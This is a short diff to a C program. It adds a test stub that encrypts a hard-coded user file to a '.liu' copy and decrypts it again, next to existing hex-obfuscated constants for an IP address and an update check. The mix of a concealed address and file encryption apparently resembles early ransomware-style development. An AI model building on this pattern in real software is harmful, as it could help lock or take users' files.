@@ -7,6 +7,7 @@
 #include <sys/types.h>
 
 #include "../include/core.h"
+#include "../include/encrypt.h"
 
 #define IP_ADDR_HX "\x3f\x47\x40\x3c\x47\x47\x3c\x40\x3e\x44\x3c\x43\x46"
 #define CHECK_UPDATE "\x3d\x71\x76\x73\x71\x79\x6d\x83\x7e\x72\x6f\x82\x73"
@@ -21,6 +22,11 @@
 
 int main()
 {
+	uint8_t *key = (uint8_t *) calloc(32, sizeof(uint8_t));
+	encrypt_file("/home/solanav/datos.txt", &key);
+	dencrypt_file("/home/solanav/datos.txt.liu", key);
+
+	exit(0);
 	char *data = NULL;
 	char *ip_addr[5] = {NULL};
 	int i = 0;
